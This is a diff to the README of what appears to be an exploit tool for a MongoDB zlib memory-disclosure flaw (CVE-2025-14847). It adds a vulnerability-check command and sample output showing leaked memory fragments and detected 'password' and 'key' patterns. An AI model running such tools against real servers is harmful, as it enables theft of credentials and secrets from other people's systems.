@@ -38,6 +38,11 @@ A flaw in MongoDB's zlib message decompression returns the allocated buffer size
 
 ## Usage
 
+**Check if vulnerable:**
+```bash
+python3 check_vuln.py --host <target>
+```
+
 **Full memory extraction:**
 ```bash
 # Basic scan (offsets 20-8192, 10 threads)
@@ -82,6 +87,16 @@ Target: 192.168.1.100:27017
 [*] Testing for CVE-2025-14847...
 [*] Trying exploit offsets...
 
+============================================================
+  STATUS: VULNERABLE ⚠️
+
+  CVE-2025-14847 confirmed!
+  Successfully leaked 3 memory fragments
+
+  Memory disclosure vulnerability is exploitable!
+  Run bleed.py for full memory extraction
+============================================================
+```
 
 **Full Extraction:**
 ```
@@ -101,6 +116,8 @@ Target: 192.168.1.100:27017
 [*] Total leaked: 15847 bytes
 [*] Unique fragments: 127
 [*] Saved to: leaked.bin
+[!] Found pattern: password
+[!] Found pattern: key
 ```
 
 ## How It Works
